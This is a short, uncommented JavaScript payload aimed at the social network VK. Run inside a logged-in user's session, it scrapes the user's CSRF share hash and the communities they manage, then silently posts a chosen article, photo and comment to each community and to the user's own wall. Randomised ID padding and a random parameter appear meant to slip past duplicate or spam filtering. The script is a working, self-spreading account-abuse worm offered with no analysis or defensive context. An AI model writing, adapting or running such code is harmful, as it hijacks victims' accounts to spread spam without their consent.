var comment = "Да я";
var title = "Крутой";
var articleId = "402324479_17434";

var request = new XMLHttpRequest;
request.open("GET", "share.php");
request.send();
request.onload = function(body) {
    var clubs = JSON.parse(request.responseText.match(/clubs: (.+?),\n/)[1]);
    var shareHash = request.responseText.match(/window.shareHash = '(.+?)';/)[1];
    clubs.forEach(function(club) {
        send(share_url(shareHash, club[0]))
    }), send(share_url(shareHash, 0))
};

function send(url) {
    var request = new XMLHttpRequest;
    request.open("GET", url);
	request.send()
}

function share_url(shareHash, clubId) {
    return "https://vk.com/share.php?act=a_submit&al=1&hash=" + shareHash + "&photo_id=" + io(456239755) + "&photo_owner_id=" + io(484644478) + "&share_comment=" + encodeURIComponent(comment) + "&title=" + encodeURIComponent(title) + (clubId ? "&to=" + clubId + "" : "") + "&url=" + encodeURIComponent("https://vk.com/public" + io(22822305) + "?w=article" + articleId + "&_fm=" + (Math.random() * 100))
}

function io(b) {
    return 4294967296 * Math.floor(1e6 * Math.random()) + b
}
